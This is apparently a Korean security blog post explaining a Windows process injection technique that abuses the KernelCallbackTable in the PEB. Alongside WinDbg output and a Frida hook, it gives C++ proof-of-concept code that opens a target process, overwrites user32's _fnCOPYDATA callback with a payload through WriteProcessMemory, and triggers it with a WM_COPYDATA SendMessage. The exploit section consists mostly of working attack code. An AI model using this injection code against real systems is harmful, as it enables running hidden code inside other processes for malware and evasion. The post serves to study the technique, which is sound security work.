---
title:  "Windows - Process Injection Technique: KernelCallbackTable"
categories:
  - WINDOWS
tags:
  - INJECTION
  - PROCESS
  - EXPLOIT
---
# Process Injection Technique: KernelCallbackTable
## 0x00_Description
윈도우 OS에서 프로세스 인젝션 기법 중 `KernelCallbackTable0(이하, KCT)`을 이용한 방법에 대하여 명세하였다. KCT는 `PEB 구조체`에 포함되어 있으며 테이블 내에는 `Callback Function들의 주소`가 저장되어 있는 구조이며 단순하게 생각하면 특정 윈도우 메세지가 전달되었을때 해당 테이블 내용을 참조하여 처리하는 함수를 호출하는 것이다.  이 문서에서는 [이 곳](https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/)을 참조하여 Callback Function을 변조하여 원하는 코드를 프로세스에 삽입하는 공격에 대하여 명세하였다.



## 0x01_Anaysis

우선, `KernelCallBackTable`은 PEB에서 확인할 수 있으며 다음은 x64에서 확인한 결과로 `PEB 시작점에서 Offset 0x58에 존재`한다.

```powershell
0:005> dt_PEB @$peb kernelcallbacktable
ntdll!_PEB
   +0x058 KernelCallbackTable : 0x00007ffc`5d448070 Void
```

이 Table의 주소를 살펴보면 아래와 같이 순차적으로 주소들이 할당되어 있다.

```powershell
0:005> dd 0x00007ffc`5d448070
00007ffc`5d448070  5d3e4900 00007ffc 5d43f870 00007ffc
00007ffc`5d448080  5d3dfa50 00007ffc 5d3e7e50 00007ffc
00007ffc`5d448090  5d3eda00 00007ffc 5d440000 00007ffc
00007ffc`5d4480a0  5d3e84c0 00007ffc 5d43fcc0 00007ffc
00007ffc`5d4480b0  5d43fd80 00007ffc 5d3ead10 00007ffc
00007ffc`5d4480c0  5d3e3a90 00007ffc 5d43fe30 00007ffc
00007ffc`5d4480d0  5d3f0100 00007ffc 5d43fe90 00007ffc
00007ffc`5d4480e0  5d43fe90 00007ffc 5d43ff90 00007ffc
```

좀 더 상세히 살펴보기 위해 `dps(Display Word and Symbols) 명령어`로 살펴보자.

```powershell
0:005> dps 0x00007ffc`5d448070 L?30  or  0:005> dps poi(@$peb+0x58) L?30
00007ffc`5d448070  00007ffc`5d3e4900 user32!_fnCOPYDATA
00007ffc`5d448078  00007ffc`5d43f870 user32!_fnCOPYGLOBALDATA
00007ffc`5d448080  00007ffc`5d3dfa50 user32!_fnDWORD
00007ffc`5d448088  00007ffc`5d3e7e50 user32!_fnNCDESTROY
00007ffc`5d448090  00007ffc`5d3eda00 user32!_fnDWORDOPTINLPMSG
00007ffc`5d448098  00007ffc`5d440000 user32!_fnINOUTDRAG
00007ffc`5d4480a0  00007ffc`5d3e84c0 user32!_fnGETTEXTLENGTHS
/* … 생략 … */
```

위 내용에서 `fnCOPYDATA과 같은 함수`들이 `WM_COPYDATA 윈도우 메시지에 대응`하여 호출되는 함수이다. 이 공격에서는 방금 언급한 fnCOPYDATA의 코드가 삽입된 영역에 원하는 코드로 대체하여 실행하는 것을 보여준다. 하지만 꼭 이 영역을 이용해야 하는 것은 아니며 다른 영역을 사용하여 원하는 코드를 실행하는 것이 가능하다.

윈도우 메시지는 [이 곳](https://wiki.winehq.org/List_Of_Windows_Messages)에서 확인하거나 `MSG 구조체 변수`를 선언하고 [Ctrl]을 누르고 추적하여 `WinUser.h`의
내용을 확인하면 된다. 이 가능하며 이 윈도우 메시지의 번호의 경우 `USER32.dll!GetMessageW()` 함수를 Hooking하여 확인이 가능한데 frida를 이용한 Windows Hooking을 주제로 상세하게 다룰 예정이지만 필자의 경우 다음 과정을 통해 구조를 확인하고 코드를 작성하였다.

우선, 다음와 같이 MSDN에서 [GetMessageW()](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getmessagew)의 함수 파라미터를 살펴보고 LPMSG가 MSG 구조체의 포인터인 것을 확인한다. 필요한 부분은 [MSG 구조체](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagmsg)에 담긴 내용이므로 해당 구조체를 확인한다.

```c++
typedef struct tagMSG {
	HWND hwnd;
	UINT message;
	WPARAM wParam;
	LPARAM lParam;
	DWORD time;
	POINT pt;
	DWORD lPrivate;
} MSG, *PMSG, *NPMSG, *LPMSG;
```

여기서 우리가 필요한 내용은 message이며 이를 토대로 코드를 작성하여 변조를 시도할 수 있다. (필자의 경우 아래와 같이 hexdump()를 이용하였으나 read를 이용하는 방법으로 더 단순하게 작성이 가능하다. )

```javascript
/* ... 생략 ... */
// ptr이 삽입되는 이유는 LPMSG가 MSG의 Pointer이기 때문
var message = ((hexdump(ptr(args[0]), { offset: 4, length: 8, header: true, ansi: false })).split('\n'))[1];

// 0x000f == WM_PAINT >> 윈도우 메시지가 WM_PAINT인 경우 변조를 시도
if (message.indexOf("0f 00 00 00") != -1) {
	var addr = "0x";
	addr = addr + ((hexdump(ptr(args[0]), { offset: 4, length: 8, header: false, ansi: false })).split(' '))[0];
	Memory.writeByteArray(ptr(addr), [0x00,0x00,0x00,0x00]);
}
/* ... 생략 ... */
```

다시 본론으로 돌아와서 공격을 위한 코드를 작성해야 한다. 이 과정에서 고려할 점은 공식적으로 구조체 정보가 제공이 안되는 부분은 Offset으로 접근해야하는데 이미 작성된 헤더를 사용하여도 무관하지만 필자의 경우 공부를 위해 직접 Offset으로 시도하였다.



## 0x02_Exploit

우선, OpenProcess()를 이용하여 Target 프로세스 Process Handle, Window Handle을 획득하고 PEB 정보를 가져오기 위해 Ntdll.dll을 로드한다.

```c++
// Get Target Process Handle
hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
if (hProcess == NULL) throw new exception("OpenProcess()");

hWindow = FindWindow(NULL, L"HxD");
if (hWindow == NULL) throw new exception("FindWindow()");

// Get Ntdll.dll!NtQueryInformationProcess Function Address
hModule = LoadLibrary(L"Ntdll.dll");
if (hModule == NULL) throw new exception("LoadLibrary()");
```

Native API를 사용하므로 다음과 같이 사용할 함수에 대한 정의를 해주고 호출한다. 이 때, PBI 변수는 윈도우에서 제공하는 `ROCESS_BASIC_INFORMATION 구조체`로 `PebBaseAddress`를 멤버 변수로 지니고 있다.

```c++
typedef ULONG(NTAPI* lpfNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

/* ... 생략 ... */
NtQueryInformationProcess = (lpfNtQueryInformationProcess)GetProcAddress(hModule, "NtQueryInformationProcess");
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
```

`winternl.h`에 공식적으로 제공되는 PEB 구조체의 경우 KernelCallbackTable를 멤버 변수로 지니고 있지 않기 때문에 필요한 구조체 정보를 직접 작성하여 Offset으로 해당 값을 읽어와 저장한다. (VS에서 자료형을 [Ctrl]를 누르고 선택하면 정의를 확인할 수 있다.)

```c++
struct T0RCHWO0D_PEB {
    UCHAR BeingDebugged;
    PVOID KernelCallbackTable;
} originPeb;

/* ... 생략 ... */
ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &rd);
```

이제 KernelCallbackTable에 존재하는 함수들의 시작 주소를 가져온다. 여기서 필요한 것은 fnCOPYDATA()이므로 많은 주소를 가져올 필요는 없다.

```c++
/* ... 생략 ... */
pKernelCallbackFuncAddr = originPeb.KernelCallbackTable;
index = 0;

while (index < 1) {
 if (ReadProcessMemory(hProcess, (BYTE*)originPeb.KernelCallbackTable + (sizeof(PVOID) * index), &pKernelCallbackFuncAddr, sizeof(ULONG), &rd)) {
        // This code for x86
        // if (pKernelCallbackTable == 0) new exception("Read KernelCallbackFuncAddr()");
        printf("\t\t[*] KernelCallbackTable[%03d] :0x%p\n", index, pKernelCallbackFuncAddr);
        pKernelCallbackTable[index] = pKernelCallbackFuncAddr;
        index++;
    }
    else throw new exception("ReadProcessMemory()");
}

```

코드 삽입 테스트를 위한 코드를 작성한다.

```c++
if (WriteProcessMemory(hProcess, *(&pKernelCallbackTable), (LPVOID)"AAAA", sizeof(4), NULL)) {
    printf("\t\t\t[*] Modifed The KernelCallBack Function", index, pKernelCallbackTable);
} else {
    printf("\t\t\t[!] Error Code : %d\n", GetLastError());
    exit(-1);
}
```

디버거에서 아래와 같이 변조된 결과를 확인할 수 있다. 이제 원하는 코드를 저 곳에 삽입하여 실행되도록 하면된다.

```powershell
/* 변조 전 */
0:005> u 00007ffc`5d3e4900
user32!_fnCOPYDATA:
00007ffc`5d3e4900 4883ec58 sub rsp,58h
00007ffc`5d3e4904 33c0 xor eax,eax
00007ffc`5d3e4906 4c8bd1 mov r10,rcx
00007ffc`5d3e4909 89442438 mov dword ptr [rsp+38h],eax
00007ffc`5d3e490d 4889442440 mov qword ptr [rsp+40h],rax
00007ffc`5d3e4912 394108 cmp dword ptr [rcx+8],eax
00007ffc`5d3e4915 740b je user32!_fnCOPYDATA+0x22 (00007ffc`5d3e4922)
00007ffc`5d3e4917 48394120 cmp qword ptr [rcx+20h],rax
0:005> u 00007ffc`5d3e4900

/* 변조 후 */
user32!_fnCOPYDATA:
00007ffc`5d3e4900 41 ???
00007ffc`5d3e4901 41 ???
00007ffc`5d3e4902 41 ???
00007ffc`5d3e4903 4133c0 xor eax,r8d
00007ffc`5d3e4906 4c8bd1 mov r10,rcx
00007ffc`5d3e4909 89442438 mov dword ptr [rsp+38h],eax
00007ffc`5d3e490d 4889442440 mov qword ptr [rsp+40h],rax
00007ffc`5d3e4912 394108 cmp dword ptr [rcx+8],eax
0:005> db 00007ffc`5d3e4900
00007ffc`5d3e4900 41 41 41 41 33 c0 4c 8b-d1 89 44 24 38 48 89 44 AAAA3.L...D$8H.D
00007ffc`5d3e4910 24 40 39 41 08 74 0b 48-39 41 20 75 05 e8 ee 03 $@9A.t.H9A u....
```

공격에 이용할 _fnCOPYDATA() 함수는 다음과 같은 형태와 구조체 파라미터를 입력 받는다. 이 구조를 대체하여 원하는 코드를 실행하도록 한다.

```c++
DWORD _fnCOPYDATA(FNCOPYDATAMSG *pMsg);

typedef struct _FNCOPYDATAMSG {
	CAPTUREBUF CaptureBuf;
	PWND pwnd;
	UINT msg;
	HWND hwndFrom;
	BOOL fDataPresent;
	COPYDATASTRUCT cds;
	ULONG_PTR xParam;
	PROC xpfnProc;
} FNCOPYDATAMSG;
```

이 후 내용은 참고 사이트와 약간의 차이가 존재한다. 우선 삽입할 PAYLOAD 만큼의 원본 코드를 복사하여 저장한다.

```c++
if (ReadProcessMemory(hProcess, (BYTE*)pKernelCallbackTable[0], originCode, sizeof(PAYLOAD), NULL)) {
    printf("\t\t\t[*] Backup Origin Code\n");
}
else throw new exception("ReadProcessMemory()");
```

삽입할 PAYLOAD를 _fnCOPYDATA() 코드 영역에 삽입한다.

```c++
if (WriteProcessMemory(hProcess, *(&pKernelCallbackFuncAddr), PAYLOAD, sizeof(PAYLOAD), NULL)) {
    printf("\t\t\t[*] Modifed The KernelCallBack Function\n");
}
else throw new exception("WriteProcessMemory()");
```

이제 SendMessage()를 Trigger로서 호출하면 코드가 실행된다.

```c++
printf("\t\t\t[*] Triger!!!\n");
WCHAR trigerMsg[] = L"t0rchwo0d";
cds.dwData = 1;
cds.cbData = lstrlen(trigerMsg);
cds.lpData = trigerMsg;
SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)& cds);
```

마지막으로 원래의 코드로 복원하고 정상 복원 여부를 확인하기 위해서 SendMessage()를 한번더 호출하여 코드가 실행되지 않는 것을 확인한다.

```c++
if (WriteProcessMemory(hProcess, *(&pKernelCallbackFuncAddr), originCode, sizeof(PAYLOAD), NULL)) {
    printf("\t\t\t[*] Restroe Origin Code\n");
}
else throw new exception("WriteProcessMemory()");
SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)& cds);
```

최종적으로 원하는 코드를 실행할 수 있도록 되었다. 현재는 외부에 존재하는 PAYLOAD를 사용하였으나 좀 더 공부하여 스스로 작성한 PAYLOAD를 삽입한다면 활용도가 높아질 것이라 생각한다. RV, RVA 등 고려하여 PAYLOAD를 작성해야하는 것으로 알고 있으나 다른 방법도 존재할 것이다. 추가로, 윈도우 핸들을 PID로 가져오도록 하는 로직과 Architecture 별로 구분하여 동작하도록 하면 좀 더 효율적으로 사용할 수 있을 것 같다.



## 0x03_PoC (YouTube)
[![Windows Process Injection Technique - KernelCallbackTable](http://img.youtube.com/vi/0Tfj243q0zA/0.jpg)](https://youtu.be/0Tfj243q0zA?t=0s) 

